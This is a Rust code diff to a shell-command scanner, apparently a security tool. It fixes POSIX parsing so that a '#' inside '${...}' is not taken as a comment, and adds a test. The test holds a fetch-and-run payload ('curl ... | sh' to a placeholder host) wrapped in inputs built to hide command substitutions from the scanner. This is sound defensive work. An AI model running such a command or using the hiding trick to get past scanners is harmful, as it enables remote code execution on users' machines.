@@ -9406,6 +9406,8 @@ fn lexical_executable_substitutions_bounded(
     let mut next_argument = 0usize;
     let mut incomplete = false;
     let mut gap = None;
+    // Open unquoted `${` scopes (POSIX).
+    let mut parameter_braces = 0usize;
     let mut i = 0usize;
     let posix_segments = (shell == ShellType::Posix).then(|| tokenize::tokenize(raw, shell));
     let uncertain_posix_mutations = posix_segments
@@ -9556,7 +9558,19 @@ fn lexical_executable_substitutions_bounded(
             }
         }
 
-        if starts_shell_line_comment(bytes, i, shell, word_start) {
+        // Inside an unquoted `${...}` a `#` is part of the parameter word,
+        // never a comment (`${x:- #} $(cmd)` runs `cmd`). `$(...)`, backtick
+        // and group bodies are captured whole below, so an open `${` is
+        // always the innermost scope here. The tokenizer applies the same
+        // rule (`tokenize::posix_hash_scope`).
+        if shell == ShellType::Posix {
+            if byte == b'$' && bytes.get(i + 1) == Some(&b'{') {
+                parameter_braces = parameter_braces.saturating_add(1);
+            } else if byte == b'}' && parameter_braces > 0 {
+                parameter_braces -= 1;
+            }
+        }
+        if parameter_braces == 0 && starts_shell_line_comment(bytes, i, shell, word_start) {
             while i < bytes.len() && bytes[i] != b'\n' {
                 i += 1;
             }
@@ -15432,6 +15446,39 @@ mod tests {
             assert!(
                 extract_urls(commented, shell).is_empty(),
                 "{shell:?} emitted a URL from commented syntax"
+            );
+        }
+    }
+
+    /// Inside an unquoted `${...}` a word-start `#` is part of the parameter
+    /// word, so the substitution after it runs (bash, dash, zsh and ksh run
+    /// it). The scan read the `#` as a comment and skipped the rest of the
+    /// line. A comment inside a `$(...)` within `${...}` is still a comment.
+    #[test]
+    fn hash_inside_a_parameter_expansion_starts_no_comment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://hash-in-parameter.example/i.sh | sh";
+        for input in [
+            format!("echo ${{x:- #}} $({payload})"),
+            format!("x=\necho ${{x:-a #b}} `{payload}`"),
+            format!("echo ${{x:- #'}}'}} $({payload})"),
+            format!("echo ${{x:-${{y:- #}}}} $({payload})"),
+        ] {
+            let bodies = executable_substitutions(&input, ShellType::Posix);
+            assert!(
+                bodies.iter().any(|body| body.contains(payload)),
+                "{input:?} -> {bodies:?}"
+            );
+        }
+        for input in [
+            format!("echo ${{x:-$(true # $({payload})\n)}}"),
+            format!("echo hi # ${{x:- $({payload})}}"),
+            format!("echo ${{x:-'# $({payload})'}}"),
+        ] {
+            let bodies = executable_substitutions(&input, ShellType::Posix);
+            assert!(
+                !bodies.iter().any(|body| body.trim() == payload),
+                "{input:?} -> {bodies:?}"
             );
         }
     }
